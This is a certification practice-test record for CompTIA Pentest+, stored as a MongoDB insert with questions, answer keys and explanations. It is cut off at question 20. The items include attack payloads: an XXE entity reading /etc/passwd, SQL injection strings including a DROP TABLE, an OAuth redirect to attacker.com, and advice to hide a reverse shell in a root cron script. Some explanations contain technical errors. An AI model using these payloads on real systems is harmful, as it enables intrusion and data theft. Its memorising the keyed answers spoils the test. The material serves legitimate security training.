db.tests.insertOne({
  "category": "penplus",
  "testId": 8,
  "testName": "CompTIA Pentest+ (PT0-003) Practice Test #8 (Very Challenging)",
  "xpPerCorrect": 10,
  "questions": [
    {
      "id": 1,
      "question": "A penetration tester is conducting an assessment of a network with a scope of 10.10.50.0/24. Running the command `nmap -sS -p- -T4 --reason 10.10.50.0/24` reveals that most hosts have port 3389 open. When the tester attempts to connect to one of the hosts using RDP, they notice the certificate shows:\n\n```\nCN = CORP-DC01\nO = CORP\nC = US\n```\n\nWhat attack technique should be attempted next?",
      "options": [
        "Hash harvesting through LLMNR/NBNS poisoning",
        "Attacking Kerberos pre-authentication with GetNPUsers.py",
        "Credential stuffing against the RDP endpoint",
        "Conducting an NTLM relay attack against SMB services"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The RDP certificate reveals this is a domain controller (CORP-DC01), indicating an Active Directory environment. In such environments, Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBNS) are commonly enabled by default and can be exploited through poisoning attacks. By responding to broadcast name resolution requests before legitimate servers, an attacker can capture NTLM challenge/response hashes that can be cracked offline. This is a logical first step before attempting more targeted attacks. Kerberoasting with GetNPUsers.py targets accounts with pre-authentication disabled, but there's no indication this vulnerability exists. Credential stuffing would be ineffective without a list of potential usernames and passwords. NTLM relay attacks require specific conditions such as SMB signing being disabled, which hasn't been confirmed by the initial reconnaissance.",
      "examTip": "When identifying a domain controller during penetration testing, always check for network poisoning opportunities before attempting more targeted attacks. LLMNR/NBNS poisoning provides hashes that can often be cracked quickly to establish an initial foothold."
    },
    {
      "id": 2,
      "question": "During a web application penetration test, the tester discovers a file upload feature. After uploading a valid JPEG image, they observe the following URL structure to access the file:\n\n```\nhttps://example.com/uploads/user_images/profile_1234.jpg\n```\n\nFurther inspection of the server response headers shows:\n\n```\nX-Powered-By: PHP/7.4.12\nServer: Apache/2.4.46 (Ubuntu)\nContent-Type: image/jpeg\n```\n\nWhich attack technique would likely be effective in bypassing upload restrictions?",
      "options": [
        "Creating a polyglot file containing both valid JPEG content and PHP code",
        "Manipulating the Content-Type header to application/octet-stream",
        "Appending a null byte after the .jpg extension followed by .php",
        "Modifying the uploaded file's MIME type to text/plain"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The server headers indicate the application runs on PHP, making it susceptible to file upload vulnerabilities. A polyglot file that contains both valid JPEG image data and embedded PHP code would likely pass the application's file type validation (which often checks only the first few bytes for the JPEG signature) while still being executable if the server is configured to process PHP files. Content-Type manipulation alone would typically fail modern upload restrictions that check the actual file content. Null byte injection (using %00) was effective in older PHP versions (before 5.3.4) but would not work in PHP 7.4.12 as indicated in the headers. MIME type modification to text/plain would likely cause the upload to be rejected, as most file upload protections validate the content type.",
      "examTip": "When testing file upload features, create polyglot files that are valid in multiple formats simultaneously, as these often bypass validation checks while maintaining malicious functionality. For PHP environments, tools like ExiftTool can embed PHP code within JPEG comment fields."
    },
    {
      "id": 3,
      "question": "A penetration tester is evaluating an API endpoint and observes the following request and response:\n\nRequest:\n```\nGET /api/users/1352 HTTP/1.1\nHost: example.com\nAuthorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.9ZxYJPOdGP7SJJgAJkJwH2AE2q5HzGJxEx-qR7Z-ZW4\n```\n\nResponse:\n```\nHTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  \"id\": 1352,\n  \"username\": \"johndoe\",\n  \"email\": \"john.doe@example.com\",\n  \"account_number\": \"AC9876543\",\n  \"role\": \"user\"\n}\n```\n\nWhich attack vector should the tester exploit?",
      "options": [
        "Modifying the user ID in the request path to access other user data",
        "Altering the JWT token's role claim from 'user' to 'admin'",
        "Injecting SQL code into the user ID parameter",
        "Attempting to bypass authorization through HTTP verb tampering"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The API endpoint appears vulnerable to an Insecure Direct Object Reference (IDOR) attack, also known as Broken Object Level Authorization (BOLA). The endpoint uses a predictable, sequential user ID (1352) in the URL path, and there's no indication that the server verifies whether the authenticated user has permission to access this specific resource. By simply changing the ID number in the path, the tester could potentially access other users' data. Modifying the JWT token's role claim would require knowing the signing key, which is not immediately available. There's no evidence of SQL injection vulnerability in the endpoint as shown. HTTP verb tampering (changing GET to POST, PUT, etc.) might bypass certain access controls but would be less likely to succeed than the direct IDOR attack.",
      "examTip": "When testing APIs, always check for IDOR/BOLA vulnerabilities by manipulating resource identifiers. These vulnerabilities remain extremely common because applications often implement authentication but fail to properly implement authorization checks."
    },
    {
      "id": 4,
      "question": "A penetration tester has gained access to a Linux system and discovers the following binary:\n\n```\n$ ls -la /usr/local/bin/backup_script\n-rwsr-xr-x 1 root root 16712 Feb 10 2023 /usr/local/bin/backup_script\n\n$ strings /usr/local/bin/backup_script\n...\nsystem(\"/usr/bin/zip -r /tmp/backup.zip /var/www/html\");\n...\n```\n\nHow should the tester exploit this binary to gain elevated privileges?",
      "options": [
        "Create a malicious 'zip' script in a directory controlled by PATH manipulation",
        "Use command injection through zip's filename parameters",
        "Exploit a race condition in the /tmp/backup.zip creation",
        "Modify the binary directly to execute arbitrary commands"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The binary has the SUID bit set (s in the permissions) and runs as root. It calls the 'zip' command without specifying its full path, making it vulnerable to PATH manipulation. The attacker can create a malicious script named 'zip' in a controlled directory, add that directory to the beginning of the PATH environment variable, and then execute the backup_script. This will cause the backup_script to run the attacker's malicious 'zip' script with root privileges. Command injection through filename parameters would require vulnerabilities in the zip program itself. There's no indication of a race condition vulnerability from the given information. Modifying the binary directly would require write permissions to the binary, which the tester likely doesn't have.",
      "examTip": "Always check SUID binaries for calls to external programs without absolute paths. PATH manipulation is a classic privilege escalation technique that works when programs call other executables using the system() function without specifying the full path."
    },
    {
      "id": 5,
      "question": "During a penetration test, you've accessed a system that appears to be a DevOps automation server. You discover the following Jenkinsfile in a repository:\n\n```groovy\npipeline {\n    agent any\n    environment {\n        AWS_ACCESS_KEY_ID = credentials('jenkins-aws-key')\n        AWS_SECRET_ACCESS_KEY = credentials('jenkins-aws-secret')\n        DOCKER_REGISTRY_PASSWORD = credentials('docker-registry-password')\n    }\n    stages {\n        stage('Deploy') {\n            steps {\n                sh \"aws s3 cp ./build s3://company-prod-artifacts/ --recursive\"\n                sh \"docker login -u deployer -p $DOCKER_REGISTRY_PASSWORD registry.company.com\"\n                sh \"docker push registry.company.com/app:latest\"\n            }\n        }\n    }\n}\n```\n\nWhich approach provides the most effective access to sensitive credentials?",
      "options": [
        "Access the Jenkins credentials store through the Jenkins script console",
        "Examine pipeline build logs for exposed credential values",
        "Analyze environment variables in the running Jenkins container",
        "Search for credentials in the .git folder of the repository"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Jenkins stores credentials in its internal credential store, and these can often be accessed via the Jenkins Script Console if the tester has appropriate access. The Jenkinsfile shows that several sensitive credentials are referenced ('jenkins-aws-key', 'jenkins-aws-secret', 'docker-registry-password') but not directly exposed in the file itself. Using the Jenkins Script Console, a tester could potentially execute Groovy code to retrieve these credentials from the Jenkins credential store. While pipeline build logs might contain sensitive information, Jenkins typically masks credentials in logs. Environment variables in a running container would only be accessible if the tester already had container access. The .git folder may contain sensitive information but usually wouldn't contain the actual credentials that are stored in Jenkins.",
      "examTip": "When testing CI/CD systems like Jenkins, focus on accessing the script console which provides powerful code execution capabilities and can be used to extract credentials from the internal credential store using appropriate Groovy scripts."
    },
    {
      "id": 6,
      "question": "A penetration tester has discovered a website with a legacy API endpoint accepting XML input. The tester sends the following request:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n<search>\n  <term>&xxe;</term>\n</search>\n```\n\nThe server responds with:\n\n```xml\n<result>\n  <count>0</count>\n  <items>root:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\n...</items>\n</result>\n```\n\nWhich file should the tester target next to gather sensitive information?",
      "options": [
        "/etc/shadow",
        "/var/www/html/config.php",
        "/proc/self/environ",
        "/root/.ssh/id_rsa"
      ],
      "correctAnswerIndex": 2,
      "explanation": "The website is vulnerable to XML External Entity (XXE) injection, as demonstrated by the successful retrieval of /etc/passwd. The optimal next target is /proc/self/environ, which contains the environment variables of the web application process. These often include sensitive information such as API keys, database credentials, or other configuration data that could provide lateral movement opportunities. While /etc/shadow would be valuable, it's rarely readable by the web server process. Similarly, /root/.ssh/id_rsa would be valuable but typically has restrictive permissions. The config.php file might contain database credentials, but its exact location is speculative without knowing the web application's structure; /proc/self/environ is a more reliable target that exists on virtually all Linux systems and often contains valuable information.",
      "examTip": "When exploiting XXE vulnerabilities, target /proc/self/environ early in your testing. This file contains environment variables that frequently include sensitive credentials, API keys, and application secrets that might not be found in more obvious configuration files."
    },
    {
      "id": 7,
      "question": "A penetration tester is reviewing an organization's network infrastructure and discovers the following in a network device configuration file:\n\n```\nsnmp-server community public RO\nsnmp-server community private RW\nsnmp-server location \"Server Room B, Floor 3\"\nsnmp-server contact \"admin@company.internal\"\n```\n\nWhat SNMP-based attack technique would provide the attacker with the greatest control over the device?",
      "options": [
        "Using the read-write community string to modify the device configuration",
        "Performing an SNMP enumeration using the public community string",
        "Leveraging SNMP traps to capture authentication credentials",
        "Conducting a brute force attack against SNMPv3 credentials"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The configuration reveals that the device has SNMP enabled with two community strings: 'public' with Read-Only (RO) access and 'private' with Read-Write (RW) access. The read-write community string 'private' would allow an attacker to not only read the device's configuration but also modify it, potentially enabling remote access, changing routing tables, or altering security controls. This provides significantly more control than simply enumerating information with the read-only 'public' string. There's no indication that SNMP traps are configured to capture credentials. Brute forcing SNMPv3 would be unnecessary since the configuration already exposes SNMPv2 community strings that provide direct access.",
      "examTip": "When testing network devices, always check for default or weak SNMP community strings, especially those with read-write access. Using SNMP write access, an attacker can often reconfigure devices entirely, creating backdoor accounts or changing network routing."
    },
    {
      "id": 8,
      "question": "A penetration tester is targeting a cloud environment and obtains the following AWS IAM policy attached to a compromised user:\n\n```json\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Sid\": \"AllowS3ListAndRead\",\n      \"Effect\": \"Allow\",\n      \"Action\": [\n        \"s3:List*\",\n        \"s3:Get*\",\n        \"s3:HeadBucket\"\n      ],\n      \"Resource\": \"*\"\n    },\n    {\n      \"Sid\": \"AllowEC2ReadAccess\",\n      \"Effect\": \"Allow\",\n      \"Action\": [\n        \"ec2:Describe*\"\n      ],\n      \"Resource\": \"*\"\n    },\n    {\n      \"Sid\": \"AllowIAMListUsers\",\n      \"Effect\": \"Allow\",\n      \"Action\": [\n        \"iam:ListUsers\",\n        \"iam:GetUser\"\n      ],\n      \"Resource\": \"*\"\n    }\n  ]\n}\n```\n\nWhich AWS CLI command would extract the most valuable information for privilege escalation?",
      "options": [
        "aws s3 ls --recursive",
        "aws ec2 describe-instances --query 'Reservations[].Instances[].UserData' --output text | base64 --decode",
        "aws iam list-users --query 'Users[*].UserName' --output text",
        "aws ec2 describe-security-groups --query 'SecurityGroups[?IpPermissions[?ToPort==`22` && IpRanges[?CidrIp==`0.0.0.0/0`]]]'"
      ],
      "correctAnswerIndex": 1,
      "explanation": "The IAM policy allows EC2 describe actions, including 'ec2:Describe*', which means the user can view EC2 instance metadata. The command 'aws ec2 describe-instances --query 'Reservations[].Instances[].UserData' --output text | base64 --decode' retrieves the UserData field from all EC2 instances, which often contains bootstrap scripts with hardcoded credentials, API keys, or other sensitive data used during instance initialization. This information frequently provides direct lateral movement opportunities. While 'aws s3 ls --recursive' could reveal sensitive files, it wouldn't automatically extract their contents. The 'aws iam list-users' command would only list usernames without providing credentials or escalation paths. The security groups query would identify potentially vulnerable SSH configurations but wouldn't directly provide access credentials.",
      "examTip": "When compromising AWS environments, always check EC2 instance UserData, which frequently contains plaintext secrets. This data is base64-encoded in the AWS API response, so remember to decode it to reveal bootstrap scripts and embedded credentials."
    },
    {
      "id": 9,
      "question": "A penetration tester has gained initial access to a Windows domain workstation and runs the following commands:\n\n```powershell\nPS C:\\> whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                          State\n============================= ==================================== ========\nSeImpersonatePrivilege        Impersonate a client after auth     Enabled\nSeAssignPrimaryTokenPrivilege Replace a process level token       Disabled\nSeTcbPrivilege                Act as part of the operating system Disabled\nSeBackupPrivilege             Back up files and directories       Enabled\nSeRestorePrivilege            Restore files and directories       Enabled\nSeDebugPrivilege              Debug programs                      Disabled\n```\n\nWhich privilege should the tester leverage for local privilege escalation?",
      "options": [
        "SeBackupPrivilege",
        "SeImpersonatePrivilege",
        "SeRestorePrivilege",
        "SeTcbPrivilege"
      ],
      "correctAnswerIndex": 0,
      "explanation": "While multiple privileges shown could potentially be used for privilege escalation, SeBackupPrivilege is the most direct path in this scenario. This privilege allows a user to read any file on the system, regardless of its permissions. A tester can leverage this to extract sensitive system files like the NTDS.dit database file or copy the SYSTEM and SAM registry hives, which can then be used to extract password hashes. Though SeImpersonatePrivilege can be exploited using techniques like Potato attacks, these are more complex and environment-dependent. SeRestorePrivilege allows writing files anywhere but typically requires a specific target file to replace. SeTcbPrivilege would be powerful but is shown as 'Disabled' in the output, meaning it cannot be leveraged.",
      "examTip": "When you encounter SeBackupPrivilege during penetration testing, use it to access critical system files like NTDS.dit, SAM, and SYSTEM registry hives, or sensitive configuration files protected by file system permissions. This privilege essentially allows reading any file on the system regardless of ACLs."
    },
    {
      "id": 10,
      "question": "A penetration tester identifies the following JavaScript code in a web application:\n\n```javascript\nfunction processUserInput() {\n  var userInput = document.getElementById('userInput').value;\n  var requestData = { data: userInput };\n  \n  fetch('/api/process', {\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json',\n    },\n    body: JSON.stringify(requestData)\n  })\n  .then(response => response.json())\n  .then(data => {\n    var resultDiv = document.getElementById('result');\n    resultDiv.innerHTML = \"Result: \" + data.result;\n  })\n  .catch(error => console.error('Error:', error));\n}\n```\n\nWhich client-side security vulnerability is present in this code?",
      "options": [
        "DOM-based Cross-Site Scripting in the result display",
        "JSON injection in the request body",
        "Cross-Site Request Forgery in the API endpoint",
        "Insecure fetch API implementation"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The code contains a DOM-based Cross-Site Scripting (XSS) vulnerability in the way it handles the server response. The line 'resultDiv.innerHTML = \"Result: \" + data.result;' directly inserts the 'data.result' value from the server response into the HTML of the page using innerHTML without any sanitization. If an attacker can control or manipulate the server response, they could inject malicious JavaScript that would execute in the user's browser context. JSON injection in the request body would require server-side vulnerabilities not evident from the client-side code shown. There's no CSRF vulnerability as fetch requests automatically include cookies and are subject to same-origin policy. The fetch API implementation itself is not insecure; the vulnerability is in how the response data is processed.",
      "examTip": "When reviewing JavaScript code during penetration tests, always look for instances where innerHTML is used with dynamic content, especially from user inputs or API responses. Using innerHTML with untrusted data is a common source of DOM-based XSS vulnerabilities."
    },
    {
      "id": 11,
      "question": "A penetration tester is analyzing an OAuth 2.0 implementation and observes the following authorization request:\n\n```\nGET /oauth/authorize?response_type=code&client_id=client123&redirect_uri=https://client-app.com/callback&state=abcdef123456 HTTP/1.1\nHost: auth-server.com\n```\n\nThe tester modifies the request to:\n\n```\nGET /oauth/authorize?response_type=code&client_id=client123&redirect_uri=https://attacker.com/callback&state=abcdef123456 HTTP/1.1\nHost: auth-server.com\n```\n\nAnd receives a successful response with an authorization code. What vulnerability has been identified?",
      "options": [
        "Improper validation of redirect_uri parameter",
        "Insufficient entropy in the state parameter",
        "Missing authorization code binding to the client",
        "Insecure transmission of the authorization code"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The successful response after changing the redirect_uri parameter to an attacker-controlled domain (attacker.com) indicates that the OAuth server is not properly validating the redirect_uri parameter. This is a critical vulnerability in OAuth implementations because it allows attackers to hijack the authorization flow and capture authorization codes intended for legitimate applications. Properly secured OAuth servers should strictly validate that the redirect_uri exactly matches one of the pre-registered redirect URIs for the specified client_id. The state parameter appears to have sufficient entropy (abcdef123456) and is being used correctly. There's no indication of missing code binding to the client from this interaction alone. While HTTPS should be used for transmitting authorization codes, the vulnerability demonstrated here is specifically about redirect URI validation.",
      "examTip": "When testing OAuth implementations, always try modifying the redirect_uri parameter to point to different domains, paths, or subdomains. Many OAuth servers implement insufficient validation, checking only that the domain matches or starts with a certain string rather than enforcing exact matches against a whitelist."
    },
    {
      "id": 12,
      "question": "A penetration tester gains access to a company's internal wiki and finds a page with Docker deployment instructions containing the following command:\n\n```bash\ndocker run -d --name app-container \\\n  -e \"DB_HOST=prod-db.internal\" \\\n  -e \"DB_USER=appuser\" \\\n  -e \"DB_PASSWORD=S3cureP@ss!23\" \\\n  -e \"API_KEY=c7d9be0de1b943adb76e29492a94b9f7\" \\\n  -p 8080:8080 \\\n  company/app:latest\n```\n\nWhat approach would be most valuable for continuing lateral movement in the environment?",
      "options": [
        "Attempting to authenticate to the database server using the discovered credentials",
        "Analyzing the container image for embedded secrets or vulnerabilities",
        "Searching for the API_KEY value in HTTP request headers for access to other services",
        "Exploiting the exposed port 8080 to access the container directly"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The Docker command exposes database credentials ('DB_USER=appuser' and 'DB_PASSWORD=S3cureP@ss!23') for a database server at 'prod-db.internal'. Using these credentials to authenticate directly to the database server would be the most valuable approach for lateral movement as database servers typically contain sensitive information and may have additional privileges in the environment. While analyzing the container image might reveal additional secrets, it requires more effort and specialized knowledge. The API_KEY value may be useful, but without knowing which service it authenticates to, its value is limited. Exploiting port 8080 would only provide access to the application itself, which is less valuable than direct database access with valid credentials.",
      "examTip": "When discovering database credentials during penetration testing, prioritize attempting to authenticate to the database directly. Database servers often contain not only sensitive data but also configuration details that can provide further lateral movement opportunities in the network."
    },
    {
      "id": 13,
      "question": "A penetration tester is assessing a Windows Active Directory environment and runs the following commands:\n\n```powershell\nPS C:\\> Get-DomainUser -PreauthNotRequired | Select-Object samaccountname\n\nsamaccountname\n--------------\nkrbtgt\nsvc_backups\n\nPS C:\\> Get-DomainUser svc_backups | Select-Object samaccountname, serviceprincipalname\n\nsamaccountname serviceprincipalname\n-------------- -------------------\nsvc_backups    backup/admin\n```\n\nWhat attack should the tester perform next?",
      "options": [
        "AS-REP Roasting against the svc_backups account",
        "Kerberoasting against the svc_backups service account",
        "Pass-the-Hash attack using the NTLM hash of svc_backups",
        "Password spraying against the domain using common passwords"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The PowerShell command 'Get-DomainUser -PreauthNotRequired' identifies user accounts that have Kerberos pre-authentication disabled, which is indicated by the 'svc_backups' account appearing in the results. When Kerberos pre-authentication is disabled, an attacker can request an AS-REP (Authentication Service Response) ticket for the user without providing valid credentials. This ticket can then be subjected to an offline brute force attack (AS-REP Roasting) to potentially reveal the user's password. While the account also has a Service Principal Name (SPN) that would make it vulnerable to Kerberoasting, AS-REP Roasting is the more direct attack based on the pre-authentication vulnerability already identified. Pass-the-Hash would require already having the NTLM hash. Password spraying is a broader, less targeted approach that doesn't leverage the specific vulnerability identified.",
      "examTip": "When you identify accounts with Kerberos pre-authentication disabled (DONT_REQ_PREAUTH flag), immediately perform AS-REP Roasting using tools like Rubeus or GetNPUsers.py from Impacket. This attack often yields credentials for service accounts with significant privileges."
    },
    {
      "id": 14,
      "question": "A penetration tester discovers the following SQL query in a web application:\n\n```php\n$userId = $_GET['id'];\n$query = \"SELECT * FROM users WHERE id = $userId\";\n$result = mysqli_query($conn, $query);\n```\n\nWhat SQL injection payload would be most effective to extract information about the database structure?",
      "options": [
        "1 UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()",
        "1; DROP TABLE users; --",
        "1 OR 1=1",
        "1); INSERT INTO users (username,password) VALUES ('hacker','hacked'); --"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The code shows a clear SQL injection vulnerability where the user input 'id' is directly concatenated into the SQL query without any sanitization or prepared statements. The most effective payload for extracting information about the database structure is '1 UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()'. This UNION-based injection retrieves table names from the current database by querying the information_schema.tables metadata table, providing valuable information about the database structure for further exploitation. The payload '1; DROP TABLE users; --' would attempt to drop a table, which is destructive and not focused on information gathering. '1 OR 1=1' would simply return all records from the users table, providing limited information. The INSERT statement would attempt to add a new user but wouldn't provide information about the database structure.",
      "examTip": "When exploiting SQL injection vulnerabilities for reconnaissance, prioritize UNION-based queries against the information_schema tables to map the database structure. Understanding the schema is crucial for efficiently extracting sensitive data in subsequent exploitation steps."
    },
    {
      "id": 15,
      "question": "A penetration tester has compromised a Linux web server and discovered the following suspicious cron job in /etc/cron.d/backup:\n\n```\n# Daily backup of web files\n0 3 * * * root /opt/scripts/backup.sh\n```\n\nExamining the script, they find:\n\n```bash\n#!/bin/bash\n# Backup script for web server\n\nBACKUP_DIR=\"/var/backups/web\"\nSOURCE_DIR=\"/var/www/html\"\nDATETIME=$(date +\"%Y%m%d-%H%M\")\n\n# Create backup directory if it doesn't exist\nmkdir -p \"$BACKUP_DIR\"\n\n# Create the backup\ntar -czf \"$BACKUP_DIR/backup-$DATETIME.tar.gz\" \"$SOURCE_DIR\"\n\n# Remove backups older than 7 days\nfind \"$BACKUP_DIR\" -name \"backup-*.tar.gz\" -mtime +7 -delete\n\n# Send notification\necho \"Backup completed successfully at $(date)\" | mail -s \"Web Server Backup\" admin@company.com\n```\n\nWhich persistence technique would be most reliable on this system?",
      "options": [
        "Modifying the backup script to include a reverse shell command",
        "Adding a new cron job in /etc/cron.d/ with a different schedule",
        "Creating a user account with root privileges",
        "Installing a kernel module to establish persistence"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The most reliable persistence technique would be modifying the existing backup.sh script to include a reverse shell command. This approach has several advantages: 1) The script already runs as root based on the cron job configuration, 2) It executes daily at 3 AM, providing regular access, 3) It sends an email notification which helps hide any evidence of compromise since the script still performs its intended function, and 4) System administrators are less likely to notice modifications to an existing script compared to new cron jobs or user accounts. Adding a new cron job would be more easily detected during system audits. Creating a root user would be noticeable in the /etc/passwd file and during logins. Installing a kernel module requires specialized knowledge and might cause system instability, potentially alerting administrators.",
      "examTip": "When establishing persistence on Linux systems, modifying existing scheduled tasks that already run as root is often more stealthy than creating new ones. Ensure your modifications don't disrupt the original functionality to avoid detection, and position your code after legitimate operations."
    },
    {
      "id": 16,
      "question": "A penetration tester has compromised a workstation and discovered it uses a password manager. The tester extracts the following file from the user's profile:\n\n```\nKeePass-DB-Format: 2.x (KDBx)\nMaster Key: AES-256 encryption with key derivation\nFile: Users\\Administrator\\Documents\\Passwords.kdbx\nSize: 12.5 KB\nLast Modified: 2023-10-15 09:32:45\n```\n\nWhich approach would be most effective for accessing the password database contents?",
      "options": [
        "Memory dumping to extract the decryption key from process memory",
        "Dictionary attack against the master password using common password lists",
        "Analyzing Windows registry for stored credentials related to the password manager",
        "Using key files potentially stored on the system or external media"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Memory dumping would be the most effective approach for accessing the KeePass database contents. When a user opens a KeePass database, the application decrypts the database and keeps the decryption key and database contents in memory while the application is running. By dumping the memory of the KeePass process, a penetration tester can potentially extract the master encryption key or the plaintext password database directly, bypassing the need to crack the master password. This technique works regardless of password complexity if the database is currently or was recently opened. Dictionary attacks could work but would be ineffective against a strong master password. Windows registry typically doesn't store KeePass credentials. Key files are a possibility but require locating the correct file among many on the system, and they're often stored on separate media for security.",
      "examTip": "When targeting password managers during penetration tests, always check if the application is running and attempt memory dumping techniques first before password cracking. Tools like Mimikatz or process-specific dumpers can extract decryption keys or cleartext passwords directly from memory, even for applications using strong encryption."
    },
    {
      "id": 17,
      "question": "A penetration tester finds an exposed Jenkins server during an external assessment. After accessing the Jenkins dashboard, they navigate to the Script Console and execute the following Groovy script:\n\n```groovy\ndef sout = new StringBuffer(), serr = new StringBuffer()\ndef proc = 'whoami'.execute()\nproc.consumeProcessOutput(sout, serr)\nproc.waitForOrKill(1000)\nprintln \"out> $sout\"\nprintln \"err> $serr\"\n```\n\nThe output shows:\n\n```\nout> jenkins\nerr>\n```\n\nWhich command should the tester execute next to further assess the system's security posture?",
      "options": [
        "cat /etc/passwd",
        "ls -la /var/lib/jenkins/credentials.xml",
        "find / -perm -4000 -type f 2>/dev/null",
        "netstat -tunlp"
      ],
      "correctAnswerIndex": 1,
      "explanation": "The initial Groovy script confirms command execution as the 'jenkins' user on a Linux system. The next logical step is to examine 'credentials.xml' in the Jenkins home directory, which contains encrypted credentials that Jenkins uses for various integrations, including passwords, API tokens, and SSH keys. This file often provides immediate value by revealing access to other systems in the environment. The 'cat /etc/passwd' command would only list users on the system, providing limited value for further exploitation. The 'find' command to locate SUID binaries is more relevant for privilege escalation after initial enumeration. The 'netstat' command would show network connections but is less immediately valuable than accessing Jenkins credentials that could provide direct access to other systems.",
      "examTip": "When compromising a Jenkins server, immediately target the credentials.xml file and other configuration files in the Jenkins home directory. These often contain encrypted credentials that can be decrypted using known Jenkins encryption mechanisms, providing access to source code repositories, cloud environments, and other integrated systems."
    },
    {
      "id": 18,
      "question": "A penetration tester has discovered a publicly accessible Elasticsearch instance. After connecting to it, they execute the following query:\n\n```\nGET /_cat/indices\n\nyellow open logstash-2023.10.01 rUdeAUJ9S0-NJYIQ6qkGGQ 5 1 1345672 0 964.2mb 964.2mb\nyellow open kibana_sample_data_logs 6TzMrpVBQemKLC-FGzGDQA 1 1 14074 0 5.7mb 5.7mb\nyellow open customer_data UhWEYNGVTLyD7tyO9mxG6w 5 1 52871 0 35.4mb 35.4mb\n```\n\nWhich query would be most valuable for the penetration tester to execute next?",
      "options": [
        "GET /customer_data/_search?size=10",
        "GET /_cluster/settings",
        "GET /_cat/nodes",
        "GET /_cluster/health"
      ],
      "correctAnswerIndex": 0,
      "explanation": "After discovering the indices in the Elasticsearch instance, the most valuable query would be 'GET /customer_data/_search?size=10', which retrieves the first 10 documents from the 'customer_data' index. This query directly accesses potentially sensitive customer information, which is likely to contain personal identifiable information (PII), account details, or other valuable data for the penetration test. The name 'customer_data' suggests this index contains business information rather than just system logs. The other queries provide system information that may be useful for understanding the Elasticsearch deployment but don't directly access sensitive data. The cluster settings, node information, and health status are more relevant for understanding the infrastructure but less likely to immediately yield sensitive information.",
      "examTip": "When discovering unprotected database instances during a penetration test, prioritize accessing data from tables or indices with names suggesting customer, user, account, or financial information. These typically contain the most sensitive data and provide immediate value compared to system configuration information."
    },
    {
      "id": 19,
      "question": "A penetration tester discovers a Kubernetes cluster with an exposed Kubernetes API server. After initial reconnaissance, they run the following commands:\n\n```bash\n$ curl -k https://10.10.10.100:6443/version\n{\n  \"major\": \"1\",\n  \"minor\": \"22\",\n  \"gitVersion\": \"v1.22.8\",\n  \"gitCommit\": \"7061dbbf75737a530bd594c637c9f41d15753df7\",\n  \"gitTreeState\": \"clean\",\n  \"buildDate\": \"2022-03-16T14:15:13Z\",\n  \"goVersion\": \"go1.16.15\",\n  \"compiler\": \"gc\",\n  \"platform\": \"linux/amd64\"\n}\n\n$ kubectl --insecure-skip-tls-verify=true --server=https://10.10.10.100:6443 get pods\nError from server (Forbidden): pods is forbidden: User \"system:anonymous\" cannot list resource \"pods\" in API group \"\" in the namespace \"default\"\n```\n\nWhich attack technique should the tester attempt next?",
      "options": [
        "Checking for anonymous access to other API endpoints using kubectl auth can-i",
        "Exploiting a known CVE in Kubernetes 1.22.8",
        "Brute-forcing the Kubernetes API using default service account tokens",
        "Scanning for exposed kubelet ports on worker nodes"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The error message indicates that the tester has anonymous access to the Kubernetes API server but lacks permissions to list pods in the default namespace. Before attempting more complex attacks, the tester should check what permissions the anonymous user actually has using 'kubectl auth can-i --list'. Many Kubernetes clusters are misconfigured to allow some API access to unauthenticated users, such as reading specific resources or accessing certain namespaces. This approach may reveal immediate opportunities without requiring exploitation of vulnerabilities. While Kubernetes 1.22.8 might have known vulnerabilities, exploiting specific CVEs would be more complex and potentially disruptive. Brute-forcing service account tokens is time-consuming and detectable. Scanning for kubelet ports is a valid technique but requires first identifying worker node IP addresses, which isn't provided in the reconnaissance information.",
      "examTip": "When testing Kubernetes clusters, always verify what permissions anonymous users have before attempting more sophisticated attacks. Use 'kubectl auth can-i --list' to enumerate allowed actions, and check access to different namespaces and resource types, as many clusters inadvertently allow partial access to unauthenticated users."
    },
    {
      "id": 20,
      "question": "A penetration tester has gained access to a web server and finds the following configuration in /etc/apache2/sites-enabled/000-default.conf:\n\n```apache\n<VirtualHost *:80>\n    ServerName example.com\n    ServerAdmin webmaster@example.com\n    DocumentRoot /var/www/html\n    ErrorLog ${APACHE_LOG_DIR}/error.log\n    CustomLog ${APACHE_LOG_DIR}/access.log combined\n    \n    <Directory /var/www/html>\n        Options Indexes FollowSymLinks\n        AllowOverride All\n        Require all granted\n    </Directory>\n    \n    ProxyPass /internal/ http://internal-server.local:8080/\n    ProxyPassReverse /internal/ http://internal-server.local:8080/\n</VirtualHost>\n```\n\nWhich attack technique would allow the tester to access internal resources?",
      "options": [
        "Using the ProxyPass directive to access the internal server",
        "Exploiting directory listing through the Options Indexes directive",
        "Leveraging AllowOverride All to upload a custom .htaccess file",
        "Modifying the server configuration through the ServerAdmin email"
      ],
      "correctAnswerIndex": 0,
